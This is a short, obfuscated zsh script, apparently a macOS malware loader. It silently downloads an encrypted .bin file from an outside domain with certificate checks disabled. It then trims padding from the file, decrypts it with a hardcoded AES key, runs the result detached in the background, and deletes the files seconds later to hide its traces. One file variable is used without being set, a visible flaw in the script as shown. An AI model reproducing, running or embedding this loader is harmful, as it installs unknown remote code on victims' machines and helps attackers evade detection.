#!/bin/zsh
y8z4f=$(mktemp /tmp/v3fey8.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mdeba478b645f64f9.bin" -o "$y8z4fz" || exit 1
xzqdgp=$(stat -f %z "$y8z4fz"); h9sq3ce=$(( xzqdgp - 2660 - 2232 ))
tail -c +$(( 2660 + 1 )) "$y8z4fz" | head -c $h9sq3ce | openssl enc -d -aes-256-cbc -k 6104b2e05d12911498b7fe7a -out "$y8z4f" 2>/dev/null
[ -s "$y8z4f" ] && chmod 700 "$y8z4f" && ( "$y8z4f" & ) && disown
( sleep 3; rm -f "$y8z4f" "$y8z4fz" ) &>/dev/null &
